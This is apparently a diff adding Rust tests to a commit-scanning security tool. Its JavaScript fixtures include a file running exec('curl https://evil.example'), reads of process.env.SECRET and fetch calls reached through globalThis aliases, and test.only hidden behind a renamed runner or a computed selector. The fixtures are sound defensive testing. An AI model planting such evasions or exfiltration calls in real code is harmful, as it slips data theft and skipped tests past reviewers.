@@ -139,3 +139,47 @@ fn rules_flag_a_lockfile_whose_tarball_host_moved_to_an_attacker() {
     assert!(r["lockfile"].as_array().unwrap().iter().any(|x| x["why"].as_str().unwrap_or("").contains("evil.example")),
         "a push that only moves the tarball download to an attacker's host is not flagged: {r}");
 }
+
+#[test]
+fn a_network_call_reached_through_a_globalthis_alias_still_needs_a_look() {
+    let (t, base) = project();
+    let head = commit(&t, &[("src/total.js", "export function total(items) {\n  return items.reduce((a, b) => a + b, 0);\n}\nconst { fetch } = globalThis;\nexport function leak(u) { return fetch(u); }\n")], &[]);
+    let r = rules(&t, &base, &head);
+    assert!(!r["powers"].as_array().unwrap().is_empty(), "fetch destructured from globalThis is a new network power, but it reduces to global:dynamic which the risky filter drops: {r}");
+}
+
+#[test]
+fn a_secret_read_reached_through_a_globalthis_alias_still_needs_a_look() {
+    let (t, base) = project();
+    let head = commit(&t, &[("src/total.js", "const g = globalThis;\nexport function total(items) {\n  return items.reduce((a, b) => a + b, 0) + g.process.env.SECRET;\n}\n")], &[]);
+    let r = rules(&t, &base, &head);
+    assert!(!r["powers"].as_array().unwrap().is_empty(), "reading process.env through a globalThis alias is a new power, but it reduces to global:dynamic which the risky filter drops: {r}");
+}
+
+#[test]
+fn a_risky_power_in_a_source_dir_named_like_tests_still_needs_a_look() {
+    let mut missed = Vec::new();
+    for dir in ["e2e", "cypress", "playwright", "__mocks__", "__fixtures__", "specs"] {
+        let (t, base) = project();
+        let head = commit(&t, &[(&format!("src/{dir}/exfil.js"), "import { exec } from 'node:child_process';\nexport function go() { exec('curl https://evil.example'); }\n")], &[]);
+        if rules(&t, &base, &head)["powers"].as_array().unwrap().is_empty() { missed.push(dir); }
+    }
+    assert!(missed.is_empty(), "child_process in a source file is excluded from the powers check because its directory name is treated as a test folder: {missed:?}");
+}
+
+#[test]
+fn a_focused_test_through_a_re_exported_runner_is_a_trick() {
+    let (t, base) = project();
+    let head = commit(&t, &[("test/runner.js", "export { it } from 'vitest';\n"),
+        ("test/total.test.js", "import { it as runTest } from './runner.js';\nimport { total } from '../src/total.js';\nimport { expect } from 'vitest';\nrunTest.only('adds', () => expect(total([1, 2])).toBe(3));\nrunTest('rounds', () => expect(total([0.1, 0.2])).toBeCloseTo(0.3));\n")], &[]);
+    let r = rules(&t, &base, &head);
+    assert!(!listed(&r, "tricks").is_empty(), "a runner re-exported through a local module and renamed hides .only, which focuses one test and skips the rest: {r}");
+}
+
+#[test]
+fn a_focused_test_through_a_computed_concat_selector_is_a_trick() {
+    let (t, base) = project();
+    let head = commit(&t, &[("test/total.test.js", "import { total } from '../src/total.js';\nimport { test, expect } from 'vitest';\ntest['on' + 'ly']('adds', () => expect(total([1, 2])).toBe(3));\ntest('rounds', () => expect(total([0.1, 0.2])).toBeCloseTo(0.3));\n")], &[]);
+    let r = rules(&t, &base, &head);
+    assert!(!listed(&r, "tricks").is_empty(), "test['on'+'ly'] is test.only at runtime and focuses one test, but the computed selector is not a plain literal so it is missed: {r}");
+}
